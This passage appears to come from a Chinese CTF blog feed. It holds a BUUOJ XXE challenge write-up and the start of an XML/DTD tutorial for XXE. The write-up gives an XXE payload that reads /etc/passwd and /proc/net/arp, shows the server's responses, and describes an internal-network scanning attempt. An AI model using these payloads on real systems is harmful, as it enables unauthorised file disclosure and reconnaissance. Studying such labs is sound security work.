class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /doLogin.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">97</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">97</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/xml, text/xml, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/xml;charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">66</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span>/<br><br><span class="hljs-section">&lt;user&gt;</span><span class="hljs-section">&lt;username&gt;</span><span class="hljs-attribute">admin</span>&lt;/username&gt;&lt;password&gt;<span class="hljs-number">123456</span>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>可以看到username和password都是用xml传的</p><p>所以就构造payload，直接抄作业</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>回显成功:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:32:58 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>968<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-ruby">&lt;result&gt;&lt;code&gt;<span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/code&gt;&lt;msg&gt;root:x:0:0:root:/root</span><span class="hljs-symbol">:/bin/bash</span></span><br><span class="language-ruby"><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span></span><br><span class="language-ruby"><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby">&lt;<span class="hljs-regexp">/msg&gt;&lt;/result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那这一串有啥用捏？好像没啥用，那就再读读其他文件: proc&#x2F;net&#x2F;arp</p><p>回显:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:44:27 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>275<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-apache"><span class="hljs-section">&lt;result&gt;</span><span class="hljs-section">&lt;code&gt;</span><span class="hljs-attribute">0</span>&lt;/code&gt;&lt;msg&gt;IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="language-apache"><span class="hljs-attribute">169</span>.<span class="hljs-number">254</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>      <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">128</span>.<span class="hljs-number">253</span>.<span class="hljs-number">12</span>    <span class="hljs-number">0</span>x1         <span class="hljs-number">0</span>x2         ee:ee:ee:ee:ee:ee     *        eth0</span><br><span class="language-apache"><span class="hljs-section">&lt;/msg&gt;</span><span class="hljs-section">&lt;/result&gt;</span></span><br></code></pre></td></tr></table></figure><p>这玩意有啥用捏? 8知道，只知道是内网的，也就是只能通过里面的服务器读取。尝试读取ip: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://http://169.254.1.1&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>至于此处为啥是http而8是https呢？8要管了，以后会懂的<br>等待过程相当龟速…..</p><p>然后结果是: 2个ip都报错，原因是connection time out in</p><p>那就利用burp的intruder扫一下端口</p><p>又是1个龟速的过程……看看有没有其他解法</p><p>扫失败了，然后就扫一下地址，又叫内网扫描(eg:把http:169.254.1.1的最后一位数进行爆破)</p><p>暴躁老哥上线，他妈的哪里出问题了? 老子一步一步按wp走的啊</p><p>分析下原因，wp里，当访问ip时的回显和我的8一样，我的是请求时间过长(connection time out in)，而wp的则是请求被拒绝(connection refused in)，一个能ping通，1个8能ping通….也许这就是问题所在</p><p>那为什么会请求时间过长呢? 我8知道，看了好多wp都是这个解法，没找到原因</p><p>请求时间过长显然是内网的服务器的问题，而8是我这边的问题，那就这样吧，这破题就这么过了</p><p>然后就很8爽啊啊啊啊啊啊</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe攻击(1)</title>
    <link href="/2022/02/10/xxe%E6%94%BB%E5%87%BB(1)/"/>
    <url>/2022/02/10/xxe%E6%94%BB%E5%87%BB(1)/</url>
    
    <content type="html"><![CDATA[<p>菜鸡脑容量有限，学完删</p><p>XXE全称balabala，即xml外部实体注入</p><p>为此首先需要了解xml，在w3school学习后做了些笔记以备忘</p><p>其次需要学习php伪协议、php解析xml的一些功能函数</p><p>还有</p><h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>很像html，用于标记文件，使其具有结构性，是标记性语言(类似ppt….个p)<br>但xml是为了传输、存储数据，而8是显示数据</p><p>xml不做任何事情，也就是纯文本，用来存储、传输信息，类似json</p><h2 id="xml结构"><a href="#xml结构" class="headerlink" title="xml结构"></a>xml结构</h2><p>eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><span class="hljs-comment">&lt;!--xml文件的声明，这个是可选的--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>                                                 <span class="hljs-comment">&lt;!--根元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">book</span> <span class="hljs-attr">category</span>=<span class="hljs-string">&quot;COOKING&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Everyday Italian<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>           <span class="hljs-comment">&lt;!--book的子元素，lang为属性--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Giada De Laurentiis<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>                  <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>2005<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>                                     <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>30.00<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>                                  <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>                                                 <span class="hljs-comment">&lt;!--book的结束--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span>                                       <span class="hljs-comment">&lt;!--bookstore的结束--&gt;</span><br></code></pre></td></tr></table></figure><p>总结:xml有根元素属性，即必须包含根元素，每个元素阔以有value和属性</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>定义xml文档的格式规范</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span> <span class="hljs-comment">&lt;!--这行是 XML文档定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">message</span> (<span class="hljs-keyword">receiver</span> ,<span class="hljs-keyword">sender</span> ,<span class="hljs-keyword">header</span> ,<span class="hljs-keyword">msg</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">receiver</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">sender</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">header</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">msg</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br></code></pre></td></tr></table></figure><p>上述格式是固定的，然后PCDATA和CDATA代指传入的文本，PCDATA文本里的标签会被解析，而CDATA则8会</p><p>可分为内部DTD和外部DTD</p><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><p>内部DTD就是xml文档和DTD写在一块,eg:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><p>外部则是引用外部文件，通过如下语法引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root-element</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;filename&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD属性<br>eg:<br>DTD:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">payment</span> <span class="hljs-keyword">Luckey</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-string">&quot;Q&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--payment可在之前被定义过，也可未定义，默认属性: Q--&gt;</span><br></code></pre></td></tr></table></figure><p>XML实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span>   <span class="hljs-comment">&lt;!--name: payment; 属性: Lucky --&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>大致阔以当变量理解，由name和value组成，有通用实体和参数实体之分，也有内部实体和外部实体之分</p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>通用实体: 用 &amp;实体名; 来引用实体，就是在DTD中定义的普通实体，这个实体在xml文档中被引用<br>参数实体: 用 % 实体名 (注意%后的空格)来在DTD内定义实体，而这个实体只能在DTD内引用(通用实体则能在xml文档里引用)，引用则是通过 % 实体名; 实现(注意’;’)<br>(参数实体也阔以引用外部实体，它在blindxxe里很有用)</p><p>声明方法:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">name</span> <span class="hljs-string">&quot;value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用方法:<br>引用通用实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;name;</span><br></code></pre></td></tr></table></figure><p>声明参数实体: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST % <span class="hljs-keyword">payment</span> <span class="hljs-keyword">Lucky</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-string">&quot;Q&quot;</span>&gt;</span>   <span class="hljs-comment">&lt;!--用% name来声明--&gt;</span><br></code></pre></td></tr></table></figure><p>引用参数实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">% name;  <span class="hljs-comment">&lt;!--注意%后的空格--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h3><p>内部实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">name</span> <span class="hljs-string">&quot;value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>eg：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">writer</span> <span class="hljs-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY c0pyright <span class="hljs-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>&amp;c0pyright;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体: 用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机<br>且外部实体支持http、file等协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;URI/URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Or:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;public_ID&quot;</span> <span class="hljs-string">&quot;URI&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span 